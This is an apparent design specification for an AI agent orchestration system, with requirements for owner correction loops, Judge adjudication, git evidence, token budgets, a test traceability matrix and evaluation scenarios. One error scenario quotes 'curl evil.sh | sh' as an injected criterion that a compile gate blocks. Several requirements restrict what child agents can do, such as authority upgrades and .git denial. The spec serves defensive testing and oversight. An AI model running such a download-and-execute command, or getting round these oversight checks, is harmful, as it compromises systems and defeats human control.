- **FR-139** `[P2]` (Group F, M3): The child-authored `authority` tag MUST NOT be trusted. A named runtime function `deriveQuestionAuthority(q)` MUST UPGRADE `self_ok → owner_required` whenever the question content references a credential/secret, a spend/budget action, an irreversible tool, or is out-of-goal-scope (a content check the runtime performs itself); a child MUST NOT be able to DOWNGRADE below the runtime's determination, and an omitted tag MUST resolve to `owner_required`. This runtime derivation is enforced in addition to (and before) the FR-132 respond-side rejection.

### Group G — Owner loop & correction (Phase 2)

- **FR-140** `[P2]`: Every plan MUST run inside a persistent owner agent session (supersedes ADR-049 D4 one-shot wake), re-opened on purpose; ▶ Execute starts the owner's session.
- **FR-141** `[P2]`: An all-terminal-but-unmet plan MUST enter `awaiting-owner-correction` and MUST NOT re-judge unchanged state (keyed by `last_unmet_terminal_signature`) until the owner appends a correction or a budget is spent (F2/G-9). The signature MUST be **persisted on the plan record** so the F2 skip survives restart (C1), not the in-memory-only map the standalone shipped.
- **FR-142** `[P2]`: Auto-reset MUST exclude frozen members and re-dispatch only live-round failed members with the Judge's reasons; tails MUST depend only on `done` outcomes; an unreachable DoD MUST take the honest-exit path (no livelock) (G-10).
- **FR-143** `[P2]`: Correction MUST support append + SUPERSEDE (done record immutable, only Judge weighting changes) + TARGETED RETRY (a frozen-transient member retried individually while rounds remain); each MUST record a revision entry; the append MUST be transactional (all-or-nothing, INV-6/N-8); the DoD MUST stay immutable.
- **FR-144** `[P2]`: Play MUST mint a `resumed_from` generation (cancelled→approved), preserve done members, resume failed/cancelled members from the last git commit (no-commit → fresh attempt), and zero JudgeRounds (G-12/D13).
- **FR-145** `[P2]`: Plan members MUST NOT expose per-member start/cancel/resume; only standalone tasks carry ▶/■/Play (D7).
- **FR-146** `[P2]`: The planner/re-planner behavior MUST be delivered by EXTENDING `pkg/skills/embedded/plan/SKILL.md` (the §3b/§3c checklists) — never a new Planner agent (BOM); an owner may gaming-guard (ladder weights deterministic rungs; post-unmet artifacts flagged post-hoc — N-2).
- **FR-147** `[P1]` (Group G, C1): Awaiting-owner-correction MUST be a **durable PLAN condition** — the system MUST persist `plan_phase=awaiting_owner_correction` (a NEW value on the existing persisted `Plan.PlanPhase` field) and `last_unmet_terminal_signature` on the plan JSONL record. While it holds, the plan-owner **session** MUST sit at the durable lifecycle state `paused` (the 8-state S2 enum MUST NOT be inflated). The plan↔owner-session linkage MUST be a **named durable field**: the Plan record MUST persist `owner_session_id` (the plan-owner agent session), and the owner session MUST carry a reciprocal `plan_id` in its scope/meta — the boot sweep resolves "this `paused` session's `plan_id` names an `awaiting_owner_correction` plan → exempt" via `owner_session_id`, since a top-level owner session's `owner_scope` is `human`, NOT `plan_id`, and cannot itself be used to identify the plan. The boot sweep MUST exempt this owner session from the `failed(interrupted)` sweep and MUST NOT re-judge the unchanged all-terminal state (INV-7/INV-9). This closes the in-memory restart gap the standalone F2 fix left (`lastUnmetTerminalSignature` dropped on restart → one spurious re-judge).
- **FR-148** `[P1]` (Group G, M4): The transactional tail-append (N members + edges + revision entry + plan-record patch) MUST be committed via a **write-ahead intent-log** whose intent record is **SELF-CONTAINED** — it MUST carry the full member BODIES (not just ids), the full edge list, the revision entry, and the plan-record patch, so replay needs nothing else. Ordering: (1) write the self-contained intent record; (2) mark it **committed** (fsync) — this is the linearization point; (3) apply each per-file write (temp+rename); (4) mark the intent **done**. Replay-forward MUST be **IDEMPOTENT** — re-applying an already-applied write is a no-op guarded by the per-intent done-marker, so a partial re-apply is safe. At boot: an **uncommitted** intent MUST be discarded (delete any partially-written members, wire no edges → exact pre-append DAG); a **committed-but-not-done** intent MUST be replayed forward idempotently to the intended post-append DAG; a **done** intent needs no action. This gives all-or-nothing (INV-6) on per-file JSONL storage, which provides only per-file temp+rename atomicity, satisfying G-11/t3.

### Group H — Git evidence & plan-lint (Phase 1)

- **FR-151** `[P1]`: `work/` MUST be an auto-initialized hidden go-git repo with write-set-scoped, serialized boundary commits (message = task · attempt · agent); a boundary commit MUST add only the member's declared write-set and surface an out-of-write-set change as contention (G-15/CRIT-2).
- **FR-152** `[P1]`: `.git` MUST be denied by operation (allow log/blame/show/diff; deny commit/amend/rebase/rm) PAIRED with a Landlock/bash-policy `.git/` block (caveat 3, security-lead dependency); HEAD-divergence MUST surface "evidence integrity lost" and fail the Judge closed on that channel (D17).
- **FR-153** `[P1]`: The auto-commit path MUST carry a size guard (skip/warn above N files/MB, OBS-3), a sensitive-value registry scan + documented purge/gc (MIN-5), and nested-repo detection with a signalled degraded contract (user repo wins, ours skips, planner/Judge/owner told — MIN-6).
- **FR-154** `[P1]`: The isolation ladder MUST degrade system-git worktree → go-git clone → subdir per runtime capability; the planner MUST never author a join the runtime cannot execute (R§8.4/D10).
- **FR-155** `[P1]`: On a runtime with no boundary commit, D13 Play-from-commit MUST fall back to a fresh attempt and the Judge MUST be told "rung-1 diffs unavailable" (R§8.4).
- **FR-156** `[P1]`: `create_plan` MUST accept `write_sets` (per member) + `rationale` (per plan); plan-lint MUST REJECT at approve any two parallel streams with overlapping write paths and any convergence without an authored join member (G-16).
- **FR-157** `[P1]`: A conflict at merge MUST surface as a plan-correction event, never silently resolved; an exploratory member MUST declare no write-set and take the **highest available isolation rung** the runtime supports (system-git worktree → go-git clone → subdir, per FR-154) — never assuming go-git `worktree add`, which does not exist (ADR §6.1 caveat 2) (D10/M6).
- **FR-158** `[P0]` **(config/non-behavioral, M7)**: go-git MUST be adopted only via the Phase-0 spike (returned GO); the Apache-2.0 NOTICE MUST ride along (a NEW `NOTICE` file for `skeema/knownhosts`); no cgo (Constraints #1/#2/#3). This is a build-time/dependency FR with no runtime behavior — it is verified by the build-size gate (SC-014) + a NOTICE-file existence check, NOT by a BDD scenario.
- **FR-159** `[P1]`: The join/merge/assemble member MUST be a first-class plan member with its own acceptance criteria at every convergence point; the Judge verifies the merged result, never raw streams.

### Group J — Budget (Phase 2)

- **FR-171** `[P2]`: There MUST be exactly ONE app-level OVERALL token budget (no money caps, no per-plan/per-goal/per-Judge budgets) debiting all workloads (owner/member/verifier/Judge) from provider-reported usage.
- **FR-172** `[P2]`: The token budget MUST NOT honor `IsPrivilegedAgent` (core-agent turns debit) — a deliberate SEC-26 posture shift (D12).
- **FR-173** `[P2]`: The debit path MUST be atomic — one shared pool, decrement + exhaustion check in one critical section — so concurrent debits cannot corrupt the counter or lose a debit (R§8.3d). Because usage is debited post-turn from provider-reported counts, `consumed` MAY exceed the cap, but the overshoot MUST be BOUNDED by the sum of the costs of turns already in flight when the pool crossed the cap (graceful wind-down); it MUST NOT be unbounded and the counter MUST NOT be corrupted (M5).
- **FR-174** `[P2]`: Overall exhaustion MUST brake every running scope to `failed(budget_exhausted)` at the next turn/adjudication boundary with a handover summary (ADR-049 NFR-3 graceful wind-down); it MUST NOT hard-fail mid-turn (R§8.3c).
- **FR-175** `[P0]`: The default `token_budget` MUST be `0` = unbounded; an unset budget MUST run unbounded with a persistent Usage-screen advisory (R§8.3a).
- **FR-176** `[P2]`: The Usage screen MUST surface a set-time warning that a token cap does not bound dollar spend uniformly across providers (R§8.3b).
- **FR-177** `[P1]` **(config/non-behavioral, M7)**: The `token_budget` ceiling MUST be restart-gated; the live lever for runaway spend is the existing Stop/cancel cascade (per-goal-id or global) — no new live token cut is added (R§8.3e). This is a config-schema/reload-semantics FR with no distinct runtime behavior beyond FR-174's brake — verified by a config test (the key is restart-gated, no live-reload path exists), NOT by a BDD scenario.
- **FR-178** `[P2]`: Attempts (per member/task, 3 native · 6) and JudgeRounds (per goal/plan) MUST remain two distinct count brakes, never conflated; whichever trips first stops its scope locally.

### Group K — S4 interlock (Phase 1/2)

- **FR-190** `[P1]`: The owner↔Judge↔messaging↔engine interlock MUST be implemented as ONE state machine honoring invariants INV-1..INV-9.
- **FR-191** `[P2]`: A verdict-land and a concurrent `steer`/`respond` MUST be serialized through the S4 lock (INV-3); a steer MUST apply at the next tool boundary.
- **FR-192** `[P1]`: A tail append (members + edges + revision entry) MUST commit all-or-nothing; a Stop/crash mid-append MUST roll back to the exact pre-append DAG (INV-6).
- **FR-193** `[P1]`: The boot sweep MUST NOT spuriously re-arm a re-judge of `awaiting-owner-correction` state — the persisted `last_unmet_terminal_signature` (FR-147) MUST be honored at boot so an unchanged all-terminal plan is not re-judged, and the `paused` awaiting-correction owner session MUST be exempt from the `failed(interrupted)` sweep (INV-7 preserved across INV-9, C1).

### Group L — Frontend & crosswalk (Phase 2/3)

- **FR-185** `[P2]`: The D14 pill-state enum (`queued/active/waiting_on_user/judge_unavailable/re-planning/judging/done/failed`) MUST extend `GoalStatusFrame.state`; the pill MUST be display-only, `pill = f(lifecycle, engine_phase_overlay, plan_phase)` per the crosswalk (R§8.10) — the three inputs being the durable session lifecycle, the ephemeral engine-phase overlay, and the durable `plan_phase`.
- **FR-186** `[P2]`: `judging` and `judge_unavailable` MUST be sourced from **ephemeral** engine-phase signals (verifier-in-flight / Judge-availability), NOT the durable lifecycle; `re-planning` MUST be sourced from the **durable** persisted `plan_phase=awaiting_owner_correction` (C1), so it reconstructs correctly after a `kill -9` (a restarted awaiting-correction plan renders `re-planning`, NOT `waiting_on_user`). All three pill states have no direct 1:1 lifecycle counterpart, and the pill enum stays deliberately distinct from the 8-state lifecycle (not a duplicate).
- **FR-187** `[P2]`: FE surfaces MUST deliver FE-1 (bottom-right pill, all 8 states, per-goal-id), FE-2 (plan tile → Graph), FE-3 (in-chat question, no reply card), FE-4 (no per-member controls), FE-5 (ActivityPanel → Agent-View session list), FE-6 (Usage-screen token budget + per-scope spend), FE-7 (untrusted-child-text sanitization), FE-8 (conversational goal/DoD confirm).
- **FR-188** `[P1]`: Mid-span `subagent_message`/`subagent_state` frames MUST extend `SubagentStartFrame`/`SubagentEndFrame` and ride the existing since-cursor WS replay so a reconnecting SPA reconstructs pill/panel state — no parallel ad-hoc channel.

### Group M — Operability (Phase 1)

- **FR-195** `[P1]`: A single `session_messaging` config section MUST expose all **21 keys** with the documented defaults: `enabled`, `wake_enabled`, `adjudication_enabled` (3); `child_send_rate`, `child_send_body`, `child_send_depth` (3); `inbox_unacked_max`, `inbox_per_type_ceiling` (2); `steer_rate`, `steer_body` (2); `cancel_grace`, `needs_input_ttl` (2); `wake_debounce`, `wake_max_per_hour` (2); `idle_quiet_window` (1); `token_budget` (1); `attempts_max`, `judge_rounds_max` (2); `message_retention`, `audit_retention`, `undelivered_retention` (3). Live-reload keys MUST take effect without restart. (The `unable_to_verify_max_reruns` verifier bound (m-4) is a verifier/judge-subsystem key, not part of this messaging section.)
- **FR-196** `[P1]`: `session_messaging.enabled=false` MUST neuter all messaging live (global kill switch); `wake_enabled=false` MUST disable the wake path live; `adjudication_enabled=false` MUST neuter the goal/plan adjudication trigger live (a trigger-level kill flag, o3 — stop the claim-or-idle adjudication engine without a rebuild) while leaving existing sessions durable for later resume.
- **FR-197** `[P1]`: Retention MUST be explicit — `message_retention` inherits 90-day session retention, `audit_retention` inherits the audit-subsystem policy, and `undelivered_retention` (the 7-day undelivered window) is a separate horizon; nothing grows unbounded by omission.

### Group N — Anti-drift & contract discipline (Phase 0)

- **FR-198** `[P0]`: The shared spine (S1 unified goal record, S2 durable session record + 8-state enum, S3 SessionMessage family, S5 budget triple, S6 claim/marker family) MUST each be ONE implementation consumed by multiple layers; a second goal store/messaging envelope/claim-marker parser/budget path is a blocking finding (DoD-11).
- **FR-199** `[P0]`: Every existing schema (AcceptanceCriterion, Plan, PlanCreateRequest, Task, JudgeVerdict, GoalStatusFrame, Session, SubagentStart/EndFrame) MUST be EXTENDED, never duplicated; the `GOAL_STATUS` marker's teaching fragment and parser MUST live in the same file (co-location, S6).

---

## Success Criteria

- **SC-001**: On an idle chat goal, the Judge fires exactly once per settlement (round delta = 1) and re-arms only on injected new activity — verified over 10 consecutive quiet windows with 0 extra adjudications.
- **SC-002**: A `GOAL_STATUS: waiting_on_user` turn produces round delta = 0 and verdict count = 0; idle settlement is suppressed for ≥ the full quiet window while waiting.
- **SC-003**: An all-terminal-but-unmet plan ticked 20 times consumes exactly 1 JudgeRound (F2 proof); removing `lastUnmetTerminalSignature` makes the test fail.
- **SC-004**: After `kill -9` mid-plan, 100% of persisted non-terminal sessions report `failed(interrupted)` within N seconds (N ≤ configured boot-sweep budget) and no session remains `running` with no live turn.
- **SC-005**: `isNeedsInputReconstructable` is a pure predicate with 0 false-preserves across the 4-clause dataset (an unreconstructable session is never preserved).
- **SC-006**: The feasibility gate rejects 100% of out-of-policy and semantically-unjudgeable criteria at `/goal set`; 0 impossible-or-unjudgeable criteria persist.
- **SC-007**: A parent `respond` to an `owner_required` question is rejected by the runtime validator in 100% of cases; the question reaches the human owner.
- **SC-008**: The overall token-pool debit is atomic — the shared counter is never corrupted under concurrent debits (decrement + exhaustion check are one critical section). Because usage is debited post-turn from provider-reported counts, `consumed` MAY exceed `budget`, but the overshoot is BOUNDED by the sum of the costs of turns already in flight when the pool crossed the cap (graceful wind-down lets running turns finish); exhaustion then brakes 100% of running scopes at the next boundary (0 mid-turn hard-fails).
- **SC-009**: Plan-lint rejects 100% of plans with overlapping parallel write-sets or join-less convergence at approve.
- **SC-010**: A boundary commit adds only the member's write-set (0 out-of-write-set files in the commit tree); `git commit/amend/rebase/rm` and `.git/` bash access are denied in 100% of attempts, while `git log/blame/show/diff` succeed.
- **SC-011**: The per-child unacked ceiling caps at 20 open question+blocker; the 21st send fails back as a tool error (0 silent drops) and a sibling child remains unaffected.
- **SC-012**: All 9 §9.1 conformance scenarios (t0/t1/t2/t3/g4/g5/g6/g7 + boot sweep) execute green as end-to-end tests asserting each drawn node/edge fired in order.
- **SC-013**: `make verify-contracts` is green with every §6 wire type generated (0 hand-written cross-boundary types; SessionMessage inline-`oneOf`).
- **SC-014**: The go-git binary-size delta stays < 10 MB (measured +3.04 MiB stripped) with no cgo; the NOTICE file exists.
- **SC-015**: `session_messaging.enabled=false` neuters messaging with 0 restarts; every numeric tunable resolves from a config key (0 magic constants in the messaging path).

---

## Traceability Matrix

| Requirement | User Story | BDD Scenario(s) | G / Diagram | Test Name(s) |
|-------------|-----------|-----------------|-------------|--------------|
| FR-101 | US-1 | Completion claim once; Round means adjudication | G-1 · t0 | TestClaim_AdjudicatesExactlyOnce_G1; Conformance_t0 |
| FR-102 | US-1 | Idle settlement fires once | G-2 · t0 | TestClaim_AdjudicatesExactlyOnce_G1 |
| FR-103 | US-1, US-12 | Claimless idle judging | G-3 · t0 | TestIdleSettlement_FiresOnceConsumesRoundRearms_G2 |
| FR-104 | US-2 | Waiting-on-user pause; No marker not-waiting | G-5 · t0 | TestWaitingOnUser_PauseNoRoundNoVerdictIdleSuppressed_G5 |
| FR-105 | US-1 | Round means adjudication | G-1 · t0 | TestRoundAccounting_AdjudicationSemantics |
| FR-106 | US-5 | Live-upgrade re-baseline | §5 boot | TestLiveUpgradeReBaseline |
| FR-107 | US-1 | Two goals independent | — | TestMultiGoalPerSession_Isolation |
| FR-108 | US-1 | Two goals independent | — | TestMultiGoalPerSession_Isolation |
| FR-109 | US-1 | Verifier turn counts as activity | G-2 | TestIdleSettlement_FiresOnceConsumesRoundRearms_G2 |
| FR-110 | US-3 | Echo-confirm | G-8 · t0 | TestGoalCompile_EchoConfirm_Amendment |
| FR-111 | US-3 | Feasibility rejects; Semantic non-judgeability | G-7 · t0 | TestFeasibilityGate_RejectsOutOfPolicy; _RejectsUnjudgeable |
| FR-112 | US-12 | Blocked check; machine checks under own policy | G-3 | TestBlockedCheck_UnableToVerify |
| FR-113 | US-3 | Echo-confirm; Re-statement amendment | G-8 · t0 | TestGoalCompile_EchoConfirm_Amendment |
| FR-114 | US-3 | Stray claim after clear inert; Goal-clear cancels compilation | — | TestGoalLoop clear (extended); TestGoalClear_CancelsInflightCompilation |
| FR-115 (R§8.1) | US-3 | Compile-gate false-accept | — | TestCriterionUnjudgeable_FailClosedEscalateOnce |
| FR-116 | US-12 | Blocked machine check; Non-verdict classifier (M1) | G-3 · t0/t2 | TestBlockedCheck_UnableToVerify; TestNonVerdictClassifier_MechanismRanPredicate |
| FR-137 (M1) | US-3, US-12 | Non-verdict classifier keys on whether the mechanism ran | G-3 | TestNonVerdictClassifier_MechanismRanPredicate |
| FR-138 (M2) | US-3 | Owner remediates a criterion_unjudgeable by re-statement | — | TestCriterionUnjudgeable_OwnerRemediation |
| FR-117 | US-5 | Boot sweep reconciles | G-13 · §5 boot | TestBootSweep_NonTerminalToFailedInterrupted |
| FR-118 | US-5 | Boot sweep reconciles | G-13 · §5 boot | TestBootSweep_NonTerminalToFailedInterrupted |
| FR-119 | US-5 | Reconstructability predicate | §5 boot | TestIsNeedsInputReconstructable_Predicate; TestBootSweep_NeedsInputReconstructable_Preserved |
| FR-120 | US-5 | Live-upgrade re-baseline | §5 boot | TestLiveUpgradeReBaseline |
| FR-121 | US-6 | Native child push | g6 | TestSessionMessage_Transport_Caps |
| FR-122 | US-6 | Illegal combo rejected | g6 | REMOVED — the cited test no longer exists (ADR-053 Amendment, 2026-08-30, removed `launch_profile`); see FR-123's entry |
| FR-123 | US-6 | Illegal combo rejected | g6 | REMOVED — superseded by ADR-053 Amendment (2026-08-30); `launch_profile` deleted outright, no legality table to test |
| FR-124 | US-6 | Snapshot capped | g6 | TestValidateContextSnapshot_AllowlistAndCap |
| FR-125 | US-6 | Ceiling fails back | g6 | TestSessionMessage_Transport_Caps |
| FR-126 | US-6 | needs_input escalation | G-6 · g6/g7 | TestNeedsInput_Expired |
| FR-127 | US-6 | Warm resume | g7 | TestConformance_g7_SessionRoundTrip_WarmQuestionRespondHandback |
| FR-128 | US-6 | Cross-boundary message obeys content-egress policy | g6 | TestMessageParentTool_ContentEgressFilter_Applied |
| FR-129 | US-6 | Ceiling fails back (durable inbox) | g6 | TestSessionMessage_Transport_Caps |
| FR-130 | US-6 | Sync-delegate wait=true question rejected by default | g6 | TestSyncDelegateWait_Rejected |
| FR-131 | US-7 | owner_required cannot be answered; Runtime derives authority (M3) | g6 | TestDelegateTool_Respond_OwnerRequiredDeniedEvenWhenAcked; TestAuthorityUpgrade_ContentDerived |
| FR-132 | US-7 | owner_required cannot be answered | g6 | TestDelegateTool_Respond_OwnerRequiredDeniedEvenWhenAcked |
| FR-133 | US-7 | self_ok answered by parent | g6 | TestConformance_g7_SessionRoundTrip_WarmQuestionRespondHandback |
| FR-134 | US-7 | Human answers in normal chat | g6 | Conformance_g6 |
| FR-135 | US-7 | Deep-chain direct-escalate | g6 | TestAuthorityValidator (escalate case) |
| FR-136 | US-8 | 3P markers; respond new session | g6 | TestDelegateTool_Respond_3P_OriginalNotLeftRunning |
| FR-139 (M3) | US-7 | Runtime derives authority fail-closed; child cannot downgrade | g6 | TestAuthorityUpgrade_ContentDerived |
| FR-140 | US-9 | Awaiting-owner-correction | G-9 · t2/t3 | TestOwnerLoop_AwaitingCorrection_OneRound |
| FR-141 | US-9, US-17 | Awaiting-owner-correction | G-9 · t2 | TestOwnerLoop_AwaitingCorrection_OneRound |
| FR-142 | US-9 | Auto-reset excludes frozen | G-10 · t2/t3 | TestAutoReset_ExcludesFrozenDoneMembers |
| FR-143 | US-9, US-16 | Correction transactional | G-11 · t3 | TestTransactionalAppend_KillMidAppend_PreAppendDAG |
| FR-144 | US-9 | Play from commit | G-12 · t2 | TestPlay_ResumeFromCommit_NewGeneration |
| FR-145 | US-9, US-14 | No per-member controls | t2 | Conformance_t2 |
| FR-146 | US-9 | Planner/re-planner extends the embedded plan skill | t3 | TestPlannerSkillExtend_NoForkedAgent; Conformance_t3 |
| FR-147 (C1) | US-5, US-9, US-16 | Awaiting-owner-correction survives restart | G-9 · §5 boot | TestBootSweep_AwaitingCorrectionOwnerNotSweptAcrossRestart |
| FR-148 (M4) | US-9, US-16 | Crash mid tail-append rolls back (intent-log) | G-11 · t3 | TestTransactionalAppend_KillMidAppend_PreAppendDAG; TestIntentLog_ReplayAtBoot_DiscardUncommitted |
| FR-151 | US-10 | Write-set-scoped commit | G-15 · g4 | TestGitEvidence_Commit_WriteSetScopedAndContentionSurfaced |
| FR-152 | US-10 | .git deny; HEAD-divergence | G-15 · g4 | TestGitSec_OpPolicy_DenySet; TestGitEvidence_Integrity_LostOnOutOfBandHistoryRewrite |
| FR-153 | US-10 | Secret written then deleted | g4 | TestGitSecSecretScan_WrittenThenDeleted |
| FR-154 | US-11 | Exploratory worktree | g4/g5 | Conformance_g5 |
| FR-155 | US-10 | Degraded ladder fresh attempt | — | TestGitEvidence_Open_NestedRepoAboveDirDegrades |
| FR-156 | US-11 | Overlapping rejected; Join-less rejected | G-16 · g4/g5 | TestPlanLint_RejectsOverlappingWriteSets; _RejectsJoinlessConvergence |
| FR-157 | US-11 | Exploratory member; conflict→correction | g4 | Conformance_g4 |
| FR-158 | US-10 | config/non-behavioral — no BDD (build-time dependency) | — | build-size gate (SC-014) + NOTICE-file existence check |
| FR-159 | US-11 | Shard+assemble authored join | g5 | Conformance_g5 |
| FR-171 | US-13 | Overall budget debits every scope | G-14 | TestTokenBudgetDebit_AtomicOnePool |
| FR-172 | US-13 | Overall budget debits every scope | G-14 | TestTokenBudgetDebit_AtomicOnePool |
| FR-173 | US-13 | Overall budget debits every scope | G-14 | TestTokenBudgetDebit_AtomicOnePool |
| FR-174 | US-13 | Exhaustion graceful wind-down | G-14 | TestTokenBudgetDebit_AtomicOnePool (brake case) |
| FR-175 | US-13 | Unset budget advisory | — | TestTokenBudget_UnsetUnbounded_Advisory |
| FR-176 | US-13 | Token≠dollar warning | — | TestTokenBudget_UnsetUnbounded_Advisory (warning case) |
| FR-177 | US-13 | config/non-behavioral — no BDD (restart-gated config key) | — | config test (key restart-gated, no live-reload path) |
| FR-178 | US-13 | Attempts and JudgeRounds are two distinct brakes | t2 | TestAttemptsVsRounds_DistinctBrakes |
| FR-185 | US-14 | Pill derives from lifecycle+overlay | — | TestLifecyclePillCrosswalk |
| FR-186 | US-14 | Pill derives from lifecycle+overlay | — | TestLifecyclePillCrosswalk |
| FR-187 | US-14 | Untrusted child text renders safely | — | Vitest FE-1..FE-8 suites |
| FR-188 | US-14 | Mid-span frames reconstruct pill/panel on reconnect | g6 | TestMidSpanFrames_Reconstruct; Conformance_g6 |
| FR-190 | US-16 | Concurrent steer/verdict serialized | — | TestS4Interlock_SteerVerdictSerialization |
| FR-191 | US-16 | Concurrent steer/verdict serialized | — | TestS4Interlock_SteerVerdictSerialization |
| FR-192 | US-16 | Crash mid tail-append | G-11 · t3 | TestTransactionalAppend_KillMidAppend_PreAppendDAG |
| FR-193 | US-16 | Boot sweep no spurious re-judge | G-9 · §5 boot | TestBootSweep (INV-7 case) |
| FR-195 | US-15 | Retention horizons named | — | TestSessionMessagingConsumer_KillSwitch_NoOpsWhenDisabled |
| FR-196 | US-15 | Global kill switch | — | TestSessionMessagingConsumer_KillSwitch_NoOpsWhenDisabled |
| FR-197 | US-15 | Retention horizons named | — | config/retention test |
| FR-198 | US-4 | One model two authors | — | schema unit + BOM review gate |
| FR-199 | US-4 | One model two authors | — | make verify-contracts; co-location test |

**Completeness check**: Every **behavioral** FR-xxx has ≥1 BDD scenario and ≥1 test. The only two FRs without a BDD scenario are the **config/non-behavioral** ones — **FR-158** (build-time go-git dependency + NOTICE, verified by the build-size gate SC-014 + a NOTICE-file existence check) and **FR-177** (restart-gated `token_budget` ceiling, verified by a config test) — which by their nature have no runtime behavior to script as Given/When/Then (M7). Every G-1..G-16 and every §9.1 diagram (t0/t1/t2/t3/g4/g5/g6/g7 + §5 boot sweep) appears in the matrix. G-map: G-1→FR-101/105; G-2→FR-102/109; G-3→FR-103/112/116/137; G-4→FR-101 (bounce dataset); G-5→FR-104; G-6→FR-126; G-7→FR-111; G-8→FR-110/113; G-9→FR-141/147/193; G-10→FR-142; G-11→FR-143/148/192; G-12→FR-144; G-13→FR-117/118/147; G-14→FR-171..174; G-15→FR-151/152; G-16→FR-156. New FRs: FR-137/FR-138 (M1/M2, Group C), FR-139 (M3, Group F), FR-147 (C1, Group G), FR-148 (M4, Group G) — each carries a BDD scenario + test above.

---

## Ambiguity Warnings

> Gates are skipped (ratification spec). The rows below are the points where the design genuinely forced a spec decision (an assumption I had to make); each is resolved in-spec, not left open, and flagged here for the operator's awareness.

| # | What was underspecified | Spec decision taken (assumption) | Note |
|---|-------------------------|----------------------------------|------|
| 1 | Boot-sweep budget `N` seconds (design says "within N s") | Assumed a configurable `boot_sweep_budget_seconds` (default suggested ≤ 30 s); SC-004 asserts "within configured budget" | Operator sets the concrete value; test uses the config, not a literal. |
| 2 | R§8.1 fail-closed **vs** escalate; the unjudgeable-vs-blocked boundary | Chose fail-closed-to-unmet verdict + escalate-to-owner ONCE, classified by the machine-checkable predicate `classifyNonVerdict` ("did the verification mechanism run?", M1). The escalate-once **surfaces** the mis-compile — it does NOT by itself prevent round-burn to exhaustion; the honest remediation is owner re-statement (a diffed amendment) or `/goal clear`, and absent owner action the goal terminates `failed(judge_rounds_exhausted)` (M2). | Pure-silent risks the round-burn D8 fights; pure-escalate-as-halt was an over-claim (removed). A blocked machine check is NOT unjudgeable — it re-runs (never scored). Justified in-line. |
| 3 | R§8.3e live budget cut | Chose **NO new live token cut** (ceiling restart-gated; live lever = Stop/cancel) | A live ceiling change would straddle two budgets (the N-15 hazard). Deliberate; flagged. |
| 4 | R§8.7 deep-chain shortcut default | Chose **opt-in, default OFF** (strict one-hop preserved) so D6 default is unchanged | The shortcut is a latency optimization, not a re-open of D6. |
| 5 | `snapshot_max_bytes` / `snapshot_max_refs` concrete values | Assumed 8 KiB / a small K, config-keyed | Concrete tuning is an operator/impl choice; the SHAPE (deny-by-default, hard-cap-reject) is normative. |
| 6 | `criterion_unjudgeable` surface (telemetry vs owner message) | Assumed a typed owner-escalation (SessionMessage) + audit event, once per goal-id | Consistent with the messaging plane; not a new verdict class. |
| 7 | Cancelled/timed_out → pill state (design pill has no "cancelled") | Mapped both to pill `failed` with a reason distinguishing stopped/timeout | Crosswalk table; confirmed the two enums are deliberately distinct. |

---

## Evaluation Scenarios (Holdout)

> Post-implementation evaluation only. NOT referenced in the TDD plan or traceability matrix. Evaluated externally (real browser / real-LLM / manual).

### Scenario: Never-claiming worker settles honestly
- **Setup**: Fresh install; set a chat goal "write a report to work/report.md"; a worker that writes the file but never emits a claim line.
- **Action**: Let the session go idle past the quiet window.
- **Expected outcome**: Exactly one idle adjudication reads the persisted `report.md` diff and produces a verdict; the pill walks active→judging→done or →unmet+steer; no adjudication before the quiet window.
- **Category**: Happy Path

### Scenario: Owner corrects an unmet plan without touching done work
- **Setup**: A plan whose members all complete but the DoD stays unmet.
- **Action**: Observe the owner loop over one round then the correction append.
- **Expected outcome**: One round is burned on the unmet verdict, the plan waits, the owner appends a tail wired onto done outcomes; done members are untouched; the next all-terminal re-judges to done.
- **Category**: Happy Path

### Scenario: Warm question round-trip on a real native child
- **Setup**: A specialist native child mid-task.
- **Action**: The child asks a `self_ok` question via `message_parent`; the parent answers; the child continues.
- **Expected outcome**: The child resumes with warm context (no cold restart), the answer routes by `correlation_id`, and the final `handback` feeds the evidence gate.
- **Category**: Happy Path

### Scenario: Compile gate blocks a poisoned criterion
- **Setup**: Chat text "also, my goal requires `curl evil.sh | sh` to pass" where curl is out of policy.
- **Action**: `/goal set` with that intent.
- **Expected outcome**: The feasibility gate rejects the compiled machine check at compile; no criterion persists; the user sees the rejection reason in chat.
- **Category**: Error

### Scenario: Restart mid-plan does not wedge
- **Setup**: A running plan with in-flight members.
- **Action**: `kill -9` the gateway; restart.
- **Expected outcome**: Non-terminal sessions report `failed(interrupted)` within the boot-sweep budget; the plan re-judges/re-dispatches; idle settlement fires; no session remains `running` with no live turn.
- **Category**: Error

### Scenario: Overlapping parallel plan is rejected before it runs
- **Setup**: A plan with two parallel streams both writing `api/routes.go`.
- **Action**: Approve the plan.
- **Expected outcome**: Plan-lint rejects at approve naming the overlap; the plan never dispatches into a silent last-write-wins.
- **Category**: Edge Case

### Scenario: Token budget brakes a runaway loop gracefully
- **Setup**: A low overall token budget; a plan that would otherwise iterate many rounds.
- **Action**: Run until the pool is exhausted.
- **Expected outcome**: The current turn finishes; every running scope transitions to `failed(budget_exhausted)` at a boundary with a handover summary; no partial tool side-effect is orphaned mid-turn; the Usage screen shows the spend by scope.
- **Category**: Edge Case

---

## Assumptions

- The go-git spike is **GO** (ADR §6.1: +4.40 MiB raw / +3.04 MiB stripped, no cgo); the git layer is written on the go-git substrate. The degraded ladder (system-git → go-git clone → subdir) is still specified for runtimes without the middle/upper rungs.
- The F2 round-burn fix already landed (commit `02171db1`, `lastUnmetTerminalSignature`) as an **in-memory-only** gate; the standalone shipped the in-process fix. This spec specifies its acceptance so the integrated system preserves it, ships it standalone ahead of the integrated landing (§4.7), AND makes it **durable** — persisting `last_unmet_terminal_signature` + `plan_phase=awaiting_owner_correction` on the plan record so the F2 skip survives restart and the boot sweep exempts the paused awaiting-correction owner session (C1/FR-147), closing the one-spurious-re-judge-on-restart gap the in-memory version left.
- The deterministic dispatch engine, verifier-as-real-agent architecture, PUT-lockdown, Stop fan-out, and boot reconciliation from ADR-049/052 are reused unchanged; only the ADR-049 D4 one-shot owner-wake + round accounting and the ADR-052 chat-goal after-every-turn trigger are superseded.
- `machine` criteria = the existing `KindCheck`; `AcceptanceCriterion` is reused unchanged (S1).
- The 8-state S2 session-lifecycle enum is a NEW durable record, distinct from `Session.status` (active/archived/interrupted) and `plan.State` (draft/approved/running/done/failed).
- Contract-first: all §6 wire types land in Phase 0 before any consuming code; the lead commits (wave agents do not commit; this spec does not commit).
- `IsPrivilegedAgent` is deliberately NOT honored for the token budget (D12).

## Clarifications

### 2026-07-22

